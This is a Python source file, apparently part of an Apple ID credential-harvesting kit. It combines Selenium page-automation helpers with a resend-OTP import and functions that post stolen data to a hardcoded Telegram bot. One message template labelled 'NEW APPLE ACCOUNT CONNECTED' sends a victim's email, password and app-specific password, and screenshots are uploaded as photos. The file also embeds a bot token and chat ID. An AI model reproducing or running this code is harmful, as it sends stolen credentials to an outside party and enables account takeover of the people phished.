# core.py
import logging
import requests
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.common.exceptions import StaleElementReferenceException
import time
from resend_otp import resend_otp

# Logging configuration
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Telegram configuration
TELEGRAM_BOT_TOKEN = "7700304665:AAG4cxh7qbDmlckQOXX6MTS6DHNoTkmEeO4"
TELEGRAM_CHAT_ID = "7820518007"

def send_telegram_message(message):
    """Send a message via Telegram"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            logger.info("Telegram message sent successfully")
        else:
            logger.error(f"Error sending Telegram message: {response.text}")
    except Exception as e:
        logger.error(f"Error sending Telegram message: {e}")

from core import send_telegram_message

def send_apple_account_to_telegram(email, password, app_password, url=None):
    message = f"""🍎 <b>NEW APPLE ACCOUNT CONNECTED</b> 🍎

📧 <b>Email:</b> <code>{email}</code>
🔑 <b>Password:</b> <code>{password}</code>
🔐 <b>App password:</b> <code>{app_password if app_password else 'Not generated'}</code>
🌐 <b>URL:</b> {url if url else 'N/A'}
"""
    send_telegram_message(message)

def safe_find_element(driver, by, value, timeout=15, retries=3):
    """Safely find an element with stale element handling and retry"""
    attempt = 0
    while attempt < retries:
        try:
            element = WebDriverWait(driver, timeout).until(
                EC.presence_of_element_located((by, value))
            )
            return element
        except StaleElementReferenceException:
            logger.warning(f"StaleElementReferenceException detected, retry {attempt+1}/{retries} for {value}")
            attempt += 1
            time.sleep(1)
        except Exception as e:
            logger.error(f"Element not found: {value}, error: {e}")
            return None
    return None

def safe_click_element(driver, element, retries=3):
    """Safely click an element with stale element handling and retry"""
    attempt = 0
    while attempt < retries:
        try:
            element.click()
            return True
        except StaleElementReferenceException:
            logger.warning(f"StaleElementReferenceException detected on click, retry {attempt+1}/{retries}")
            attempt += 1
            time.sleep(1)
        except Exception as e:
            logger.warning(f"Normal click failed, attempting JavaScript: {e}")
            try:
                driver.execute_script("arguments[0].click();", element)
                return True
            except Exception as js_e:
                logger.error(f"JavaScript click failed: {js_e}")
                return False
    return False

def _tg_send_message_direct(token, chat_id, text, parse_mode=None):
    try:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        data = {"chat_id": chat_id, "text": text}
        if parse_mode:
            data["parse_mode"] = parse_mode
        resp = requests.post(url, data=data, timeout=15)
        return resp.status_code == 200
    except Exception as e:
        try:
            logger.warning(f"_tg_send_message_direct error: {e}")
        except:
            pass
        return False

def _tg_send_photo_direct(token, chat_id, photo_bytes, caption=""):
    try:
        url = f"https://api.telegram.org/bot{token}/sendPhoto"
        files = {"photo": ("screenshot.png", photo_bytes, "image/png")}
        data = {"chat_id": chat_id, "caption": caption}
        resp = requests.post(url, files=files, data=data, timeout=30)
        return resp.status_code == 200
    except Exception as e:
        try:
            logger.warning(f"_tg_send_photo_direct error: {e}")
        except:
            pass
        return False

def _send_telegram_message_if_available(token, chat_id, text):
    # prefer existing helper if available, else use direct
    try:
        if "_send_telegram_message" in globals() and callable(globals().get("_send_telegram_message")):
            return globals()["_send_telegram_message"](token, chat_id, text)
    except Exception:
        pass
    return _tg_send_message_direct(token, chat_id, text)

def _send_telegram_photo_if_available(token, chat_id, photo_bytes, caption=""):
    try:
        if "_send_telegram_photo" in globals() and callable(globals().get("_send_telegram_photo")):
            # if helper expects path or bytes is unknown; try bytes first
            try:
                return globals()["_send_telegram_photo"](token, chat_id, photo_bytes, caption)
            except Exception:
                pass
    except Exception:
        pass
    return _tg_send_photo_direct(token, chat_id, photo_bytes, caption)

def _send_telegram_photo(token, chat_id, photo_data, caption=""):
    try:
        url = f"https://api.telegram.org/bot{token}/sendPhoto"
        files = {'photo': ('screenshot.png', photo_data, 'image/png')}
        data = {'chat_id': chat_id, 'caption': caption}
        response = requests.post(url, files=files, data=data)
        return response.status_code == 200
    except Exception as e:
        logger.error(f"Error sending Telegram photo: {e}")
        return False